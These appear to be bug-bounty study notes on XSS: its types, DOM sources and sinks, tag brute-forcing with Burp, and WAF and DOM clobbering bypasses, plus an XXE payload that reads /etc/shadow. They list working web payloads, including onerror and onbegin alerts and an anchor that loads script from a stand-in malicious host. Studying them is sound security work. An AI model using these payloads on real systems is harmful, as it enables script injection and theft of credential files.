# Xss

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Theory
### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> types
#### Stored (Persistent) 
XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

#### Reflected (Non-Persistent) XSS 	
Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)


#### DOM-based XSS 	Another Non-Persistent 
XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)


### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> Source & Sink

To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. 
```
    document.write()
    DOM.innerHTML
    DOM.outerHTML

jQuery library functions that write to DOM objects are:
    add()
    after()
    append()
```

------------------------------------------

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> xss bypass
### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> innerHTML 
The innerHTML function does not allow the use of the <script> tags within it as a security feature
```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
As alternative it can be used something like
```javascript
<img src="" onerror=alert(window.origin)>
```

### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> else
```js
<<a|ascript>alert('xss')</script>
```

##  Deprecated Interface XXE injection
Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
- search xxe payload
- look for POST requests
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
</userInfo>
```
--------------------------------------------

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Tags bruteforcing
- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

#### steps 
Searching for allowed tags to be inserted in the search field as parameter
1. 'insertpayloadhere' in the field
2. intercept with burp and send to intruder
3. add the tag list to the payload in the intruder settings
4. brute force and look for the 200, we're looking for a tag which allow to have <script> </script>
5. once the tag has been found you need to search for the event eg:onbegin
6. in the search field we will use url encoding: 
```
%3C -> < 
%3E -> >
%20 -> space
%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Waf bypass with anchor
- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
```
onmouseover=alert(document.location.has.substring(1))#payloadhere
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> DOM XSS
```
 <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
 src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
 auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
 ```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80">  Exploiting DOM clobbering to enable XSS
- [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
- [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [portswigger/dom-based/Advanced-dom-clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)
- [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection)

#### Clobbering definition:
To strike violently and repeatedly; batter or maul. But, In software engineering and Computer science, clobbering a file, Processor register or regions of computer memory is the process of overwriting its contents completely. 

#### Explanation:
~~DOM clobbering is a technique to escalate HTML injection to XSS which has a high impact  DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.~~
DOM Clobbering use the HTMLCollection vulnerability which allow you to add to the HTMLCollection a malicious item with the same id. 
#### Steps:
1. find a form where you can submit some html
2. check in the javascript if there is a ```window.element || something here``` 
3. bypass the sanitization with double anchortag
  - ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>```
  - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```


## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Videos:
- xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
  - filtering and sanitazation come frontend back end.
  - Always test that frontend and backend are sanitized.
  - eg: registering an account by API with email.
- [w3schools.com/xml](https://www.w3schools.com/xml/xml_dtd.asp)
- [XXE Lab Breakdown: Exploiting XXE using external entities to retrieve files](https://www.youtube.com/watch?v=71dZaGfOVqw)
- [How to search for XXE!](https://www.youtube.com/watch?v=0DQnWalxYb4)
- [Web App Testing: Episode 3 - XSS, SQL Injection, and Broken Access Control](https://www.youtube.com/watch?v=azYwfI26oXo&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=3)


 
